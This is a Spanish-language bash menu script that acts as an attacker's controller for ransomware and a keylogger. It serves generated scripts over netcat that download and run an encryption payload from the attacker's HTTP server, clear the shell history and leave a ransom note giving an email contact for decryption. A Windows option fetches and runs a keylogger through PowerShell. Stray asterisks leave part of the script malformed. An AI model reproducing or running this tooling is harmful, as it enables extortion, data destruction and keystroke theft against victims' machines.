#!/bin/bash

while true; do
    clear
    echo "========================"
    echo "        MENÚ            "
    echo "========================"
    echo "1. Encriptar"
    echo "2. Desencriptar"
    echo "3. Ejecutar Script para Windows"
    echo "4. Salir"
    echo "========================"
    read -p "Seleccione una opción [1-4]: " opcion

    case $opcion in
        1)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script datos.sh
            cat <<EOF > encriptar.sh
#!/bin/bash
wget http://$var:8000/py/encriptacion.py
python3 encriptacion.py
history -c
echo Para desencriptar escribe a enoc.girona@gmail.com >> leer.txt
exit
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script remoto a través de nc
            cat encriptar.sh | nc -4 -lvp 45000 -s $var
            ;;
        2)
            
            # Crear el script desencriptar.sh
            cat <<EOF > desencriptar.sh
#!/bin/bash
wget http://$var:8000/py/desencriptar.py
python3 desencriptar.py
history -c
rm -rf desencriptar.py
rm -rf key.zip
rm -rf leer.txt
rm -rf freebtc.sh
exit
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script desencriptar.sh a través de nc
            cat desencriptar.sh | nc -4 -lvp 45000 -s $var
            ;;
                3)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script de comandos para el logger
            cat <<EOF > logger.sh      
****ipconfig
ipconfig
powershell.exe Invoke-WebRequest -Uri "http://$var/exe/keylogger.txt" -OutFile "keylogger.txt"
powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'keylogger.ps1'"
powershell.exe -File "C:\\Users\\Malware-User\\Music\\keylogger.ps1"
EOF*****
         
            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
            echo "Esperando conexión del cliente..."
            nc -lvp 45000 -s $var
            *****echo "Ejecutando los comandos de logger.sh en esta máquina..."
            bash logger.sh*****
            ;;

        4)
            echo "Saliendo..."
            break
            ;;
        *)
            echo "Opción no válida. Intente de nuevo."
            ;;
    esac
    read -p "Presione enter para continuar..."
done
